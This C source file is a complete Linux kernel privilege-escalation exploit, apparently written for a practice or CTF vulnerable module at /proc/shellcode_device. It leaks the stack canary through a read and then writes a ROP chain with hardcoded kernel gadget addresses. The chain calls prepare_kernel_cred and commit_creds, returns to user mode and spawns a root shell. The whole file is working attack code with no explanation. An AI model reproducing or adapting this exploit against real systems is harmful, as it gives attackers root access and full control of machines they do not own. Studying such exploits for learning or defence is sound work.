#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>


#define swapgs_restore_regs_and_return_to_usermode 0xffffffff81c00a45
#define pop_rdi 0xffffffff81a44b5e
#define pop_rcx 0xffffffff81065913
#define prepare_kernel_cred 0xffffffff810881d0
#define commit_creds 0xffffffff81087e90
#define mov_rdi_rax_rep_ret 0xffffffff8101c07b

unsigned long user_cs, user_ss, user_rsp, user_rflags;

void fatal(const char *msg)
{
    perror(msg);
    exit(-1);
}

static void spawn_shell() {
    char *argv[] = { "/bin/sh", NULL };
    char *envp[] = { NULL };
    puts("[+] win!");
    execve("/bin/sh", argv, envp);
  }

static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory"
    );
}


int main()
{
    save_state();

    int fd = open("/proc/shellcode_device", O_RDWR);

    char buf[0x400] = { 0 };

    read(fd, buf, 0x100);

    unsigned long *p = (unsigned long *)buf;

    unsigned long canary = p[0x4];
    printf("[+] leak canary: 0x%016lx\n", canary);

    memset(buf, 0, 0x100);

    for (int i = 0; i < 0x30 / 8; i++)
        p[i] = canary;
    
    unsigned long *rop = (unsigned long *)&buf[0x30];
    *rop++ = pop_rdi;
    *rop++ = 0x0;
    *rop++ = prepare_kernel_cred;
    *rop++ = pop_rcx;
    *rop++ = 0x0;
    *rop++ = mov_rdi_rax_rep_ret;
    *rop++ = commit_creds;
    *rop++ = swapgs_restore_regs_and_return_to_usermode;
    *rop++ = 0xdeadbeef;
    *rop++ = 0xdeadbeef;
    *rop++ = (unsigned long)&spawn_shell;
    *rop++ = user_cs;
    *rop++ = user_rflags;
    *rop++ = user_rsp;
    *rop++ = user_ss;

    write(fd, buf, 0x100);

    close(fd);
    
    return 0;
}
